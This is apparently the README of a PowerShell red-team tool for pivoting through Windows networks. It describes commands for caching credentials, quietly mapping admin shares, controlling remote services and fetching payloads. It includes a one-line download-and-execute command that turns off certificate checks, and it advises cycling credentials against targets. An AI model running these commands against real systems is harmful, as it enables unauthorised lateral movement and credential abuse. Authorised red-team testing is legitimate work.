Casper-the-friendly-shell
=========================

STANDARD DISCLAIMER: Unlike most people who commit code to github, my 
primary motivation is simply to find a place for interesting code to live 
if I don't want to lose track of it.  You'll find my coding styles vary 
from project to project and that I pay little attention to community 
standards or feedback.  I do all that stuff at my day job.  Enjoy!  

This powershell script was conceived to help with RedTeam pivoting activities by
consolidating a large collection of click scripts into a single, cohesive series 
of commands that augment the powershell interpreter.

The idea behind Casper is to take the situational awareness
provided by other tools (ie Veil Powerview) and provide
a low-footprint capability for interacting with the
identified assets.  We want to ...
  
      - Implement everything in native Powershell and
        available APIs using no external programs
      - Add no overt drive letters to a running system
        but still make browsing of remote shares easy   
      - Remove much of the pain of entering or pasting
        repetitive credentials and target information
      - Cache credentials securely in memory
      - Provide a shell environment that gives immediate
        and useful feedback about its state
      ... and last but not least ...
      - Be Simple
    
Ways to source this script into a powershell environment:
    1. Copy script and paste at PS prompt
    
    2. Dot-sourcing from the PS prompt
       PS> . .\casper.ps1
       
    3. Sourcing as a remote HTTP resource
       [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
       IEX(New-Object Net.WebClient).DownloadString('https://server/casper.ps1')
       # Note...first line may only be required if using SSL.
      
Once sourced, the following commands will be added to 
powershell for immediate use:
    
    casper       (Prints available commands and examples.)
    creds        (Cache new user/pass credentials.)
    target       (Cache new target credentials.)
    env          (Print the cache.)
    list         (List currently mapped shares.)
    list-remote  (List shares on target specified in cache.)
    map          (Map a share from the target specified in cache.)
    unmap        (Unmap a mapped share.)
    browse       (Browse a mapped share.)
    download     (Download a payload via HTTP.)
    services     (List remote services.)
    service      (Control remote service.)
    
Since Capser intentionally doesn't create new drive letters, 
labels are used instead.
    
    >>> list
      Localhost has 3 mapped drive(s).
      
      Label                                   Share
      ------                                  -----
      32B5                                    \\192.168.101.39\c$
      F699                                    \\192.168.101.39\adm
      z:                                      \\192.168101.97\c$
      
  A label is a function of the hash generated by the share 
  string.  That is how Casper knows which label corresponds
  to which mapped share.  
      
  Any share that has a drive letter (ie "z:") instead of a 
  label CAN be manipulated by casper but it is implicitly
  assumed to have been legitimately mapped by the administrator
  and is thus ignored by commands like 'unmap *'.  
    
To get started, source casper into your powershell interpreter,
have an idea of some targets to hit and some credentials to use,
and set your credentials and target, and go!  
      
     UNSET@UNSET [C:\wherever]
     >>> target 192.168.101.40
     
     UNSET@192.168.101.40 [C:\wherever]
     >>> creds dom\user1 P@$$w0rd
     
     dom\user1@192.168.101.40 [C:\wherever]
     >>> env
        Username  ppf\administrator
        Password  >12deathstarStar Wars !@<
        Target    192.168.25.250
     
      
   You can set the target and credentials independently allowing 
   you to ...
       - Iterate through several targets using a single successful  
         set of credentials
       - Iterate through various credentials for a single target
         until you find some that work
